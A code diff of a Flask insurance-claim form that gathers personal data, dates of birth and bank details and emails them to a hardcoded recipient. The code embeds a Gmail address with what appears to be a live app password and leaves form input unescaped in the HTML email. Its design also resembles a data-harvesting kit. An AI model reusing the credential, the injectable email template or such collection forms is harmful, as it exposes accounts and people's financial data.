@@ -2,6 +2,7 @@ from flask import Flask, render_template, request
 from flask_mail import Mail, Message
 import os
 from werkzeug.utils import secure_filename
+from datetime import datetime
 
 app = Flask(__name__)
 app.secret_key = 'your_secret_key'
@@ -20,11 +21,124 @@ app.config['MAIL_USERNAME'] = 'ofomimatthew7@gmail.com'
 app.config['MAIL_PASSWORD'] = 'ctrqvcarhcuibgdy'
 mail = Mail(app)
 
-# Set the hardcoded recipient (like in Django's view)
+# Set the hardcoded recipient
 RECIPIENT_EMAIL = 'RaphaelEzema@SignalAllianceTechnology174.onmicrosoft.com'  
 
 def allowed_file(filename):
     return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS
+
+def generate_html_table(data):
+    html = """
+    <html>
+        <head>
+            <style>
+                body { font-family: Arial, sans-serif; }
+                table { border-collapse: collapse; width: 100%; margin: 20px 0; }
+                th, td { border: 1px solid #dddddd; text-align: left; padding: 8px; }
+                th { background-color: #f2f2f2; }
+                .section-header { background-color: #e6e6e6; font-weight: bold; }
+            </style>
+        </head>
+        <body>
+            <h2>New Insurance Claim Submission</h2>
+    """
+    
+    # Prepare all data with defaults for optional fields
+    formatted_data = {
+        **data,
+        'police_report_number': data.get('police_report_number', 'N/A'),
+        'witness_information': data.get('witness_information', 'N/A'),
+        'repair_estimates': data.get('repair_estimates', 'N/A'),
+        'medical_details': data.get('medical_details', 'N/A'),
+        'swift_code': data.get('swift_code', 'N/A')
+    }
+
+    # Policyholder Information
+    html += """
+            <table>
+                <tr><th colspan="2" class="section-header">Policyholder Information</th></tr>
+                <tr><td>Full Name</td><td>{policyholder_name}</td></tr>
+                <tr><td>Policy Number</td><td>{policy_number}</td></tr>
+                <tr><td>Address</td><td>{policyholder_address}</td></tr>
+                <tr><td>Phone Number</td><td>{policyholder_phone}</td></tr>
+                <tr><td>Email Address</td><td>{policyholder_email}</td></tr>
+                <tr><td>Date of Birth</td><td>{policyholder_dob}</td></tr>
+            </table>
+    """.format(**formatted_data)
+    
+    # Claimant Information (if different)
+    if data['claimant_different'] == 'yes':
+        html += """
+            <table>
+                <tr><th colspan="2" class="section-header">Claimant Information</th></tr>
+                <tr><td>Full Name</td><td>{claimant_name}</td></tr>
+                <tr><td>Relationship to Policyholder</td><td>{claimant_relationship}</td></tr>
+                <tr><td>Contact Information</td><td>{claimant_contact}</td></tr>
+            </table>
+        """.format(**formatted_data)
+    
+    # Claim Information
+    html += """
+            <table>
+                <tr><th colspan="2" class="section-header">Claim Information</th></tr>
+                <tr><td>Nature of Claim</td><td>{nature_of_claim}</td></tr>
+                <tr><td>Incident Type</td><td>{incident_type}</td></tr>
+            </table>
+    """.format(**formatted_data)
+    
+    # Incident Details
+    html += """
+            <table>
+                <tr><th colspan="2" class="section-header">Incident Details</th></tr>
+                <tr><td>Date of Incident</td><td>{incident_date}</td></tr>
+                <tr><td>Time of Incident</td><td>{incident_time}</td></tr>
+                <tr><td>Location of Incident</td><td>{incident_location}</td></tr>
+                <tr><td>Description of Incident</td><td>{incident_description}</td></tr>
+                <tr><td>Cause of Loss/Damage</td><td>{cause_of_loss}</td></tr>
+                <tr><td>Police Report Number</td><td>{police_report_number}</td></tr>
+                <tr><td>Witness Information</td><td>{witness_information}</td></tr>
+            </table>
+    """.format(**formatted_data)
+    
+    # Loss and Damage
+    html += """
+            <table>
+                <tr><th colspan="2" class="section-header">Loss and Damage</th></tr>
+                <tr><td>Description of Items</td><td>{loss_description}</td></tr>
+                <tr><td>Estimated Value</td><td>{estimated_value}</td></tr>
+                <tr><td>Repair Estimates</td><td>{repair_estimates}</td></tr>
+                <tr><td>Medical Details</td><td>{medical_details}</td></tr>
+            </table>
+    """.format(**formatted_data)
+    
+    # Bank Details
+    html += """
+            <table>
+                <tr><th colspan="2" class="section-header">Bank Details for Payout</th></tr>
+                <tr><td>Account Name</td><td>{account_name}</td></tr>
+                <tr><td>Bank Name</td><td>{bank_name}</td></tr>
+                <tr><td>Account Number</td><td>{account_number}</td></tr>
+                <tr><td>Bank Branch</td><td>{bank_branch}</td></tr>
+                <tr><td>Swift Code</td><td>{swift_code}</td></tr>
+            </table>
+    """.format(**formatted_data)
+    
+    # Supporting Documents
+    if data['filenames']:
+        html += """
+            <table>
+                <tr><th class="section-header">Supporting Documents</th></tr>
+        """
+        for filename in data['filenames']:
+            html += f"<tr><td>{filename}</td></tr>"
+        html += "</table>"
+    
+    html += """
+        </body>
+    </html>
+    """
+    
+    return html
 
 @app.route('/', methods=['GET', 'POST'])
 def submit_claim():
@@ -32,45 +146,110 @@ def submit_claim():
 
     if request.method == 'POST':
         try:
-            full_name = request.form['full_name']
-            email = request.form['email']
-            phone = request.form['phone']
+            # Policyholder Information
+            policyholder_name = request.form['policyholder_name']
             policy_number = request.form['policy_number']
-            claim_type = request.form['claim_type']
+            policyholder_address = request.form['policyholder_address']
+            policyholder_phone = request.form['policyholder_phone']
+            policyholder_email = request.form['policyholder_email']
+            policyholder_dob = request.form['policyholder_dob']
+            
+            # Claimant Information
+            claimant_different = request.form.get('claimant_different', 'no')
+            claimant_name = request.form.get('claimant_name', '')
+            claimant_relationship = request.form.get('claimant_relationship', '')
+            claimant_contact = request.form.get('claimant_contact', '')
+            
+            # Claim Information
+            nature_of_claim = request.form['nature_of_claim']
+            incident_type = request.form['incident_type']
+            
+            # Incident Details
             incident_date = request.form['incident_date']
-            description = request.form['description']
-            claim_amount = request.form['claim_amount']
-            file = request.files['document']
+            incident_time = request.form['incident_time']
+            incident_location = request.form['incident_location']
+            incident_description = request.form['incident_description']
+            cause_of_loss = request.form['cause_of_loss']
+            police_report_number = request.form.get('police_report_number', '')
+            witness_information = request.form.get('witness_information', '')
+            
+            # Loss and Damage
+            loss_description = request.form['loss_description']
+            estimated_value = request.form['estimated_value']
+            repair_estimates = request.form.get('repair_estimates', '')
+            medical_details = request.form.get('medical_details', '')
+            
+            # Bank Details
+            account_name = request.form['account_name']
+            bank_name = request.form['bank_name']
+            account_number = request.form['account_number']
+            bank_branch = request.form['bank_branch']
+            swift_code = request.form.get('swift_code', '')
+            
+            # Handle file uploads
+            uploaded_files = request.files.getlist('documents')
+            filenames = []
+            
+            for file in uploaded_files:
+                if file and allowed_file(file.filename):
+                    filename = secure_filename(file.filename)
+                    filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
+                    file.save(filepath)
+                    filenames.append(filename)
 
-            filename = ''
-            if file and allowed_file(file.filename):
-                filename = secure_filename(file.filename)
-                filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
-                file.save(filepath)
+            # Prepare data for email
+            data = {
+                'policyholder_name': policyholder_name,
+                'policy_number': policy_number,
+                'policyholder_address': policyholder_address,
+                'policyholder_phone': policyholder_phone,
+                'policyholder_email': policyholder_email,
+                'policyholder_dob': policyholder_dob,
+                'claimant_different': claimant_different,
+                'claimant_name': claimant_name,
+                'claimant_relationship': claimant_relationship,
+                'claimant_contact': claimant_contact,
+                'nature_of_claim': nature_of_claim,
+                'incident_type': incident_type,
+                'incident_date': incident_date,
+                'incident_time': incident_time,
+                'incident_location': incident_location,
+                'incident_description': incident_description,
+                'cause_of_loss': cause_of_loss,
+                'police_report_number': police_report_number,
+                'witness_information': witness_information,
+                'loss_description': loss_description,
+                'estimated_value': estimated_value,
+                'repair_estimates': repair_estimates,
+                'medical_details': medical_details,
+                'account_name': account_name,
+                'bank_name': bank_name,
+                'account_number': account_number,
+                'bank_branch': bank_branch,
+                'swift_code': swift_code,
+                'filenames': filenames
+            }
 
-            # Send email to the hardcoded recipient
+            # Send email with HTML table
             msg = Message('New Insurance Claim Submission',
-                          sender=app.config['MAIL_USERNAME'],
-                          recipients=[RECIPIENT_EMAIL])
-            msg.body = f"""
-Full Name: {full_name}
-Email: {email}
-Phone: {phone}
-Policy Number: {policy_number}
-Claim Type: {claim_type}
-Incident Date: {incident_date}
-Description: {description}
-Claim Amount: {claim_amount}
-"""
-
-            if filename:
+                         sender=app.config['MAIL_USERNAME'],
+                         recipients=[RECIPIENT_EMAIL])
+            
+            msg.html = generate_html_table(data)
+            
+            # Attach files
+            for filename in filenames:
+                filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
                 with open(filepath, 'rb') as f:
-                    msg.attach(filename, file.mimetype, f.read())
+                    msg.attach(filename, 'application/octet-stream', f.read())
 
             mail.send(msg)
             show_modal = True
 
         except Exception as e:
-            print(f"Error sending email: {e}")
+            print(f"Error processing claim: {e}")
 
     return render_template('form.html', show_modal=show_modal)
+
+if __name__ == '__main__':
+    app.run(debug=True, port=5000)
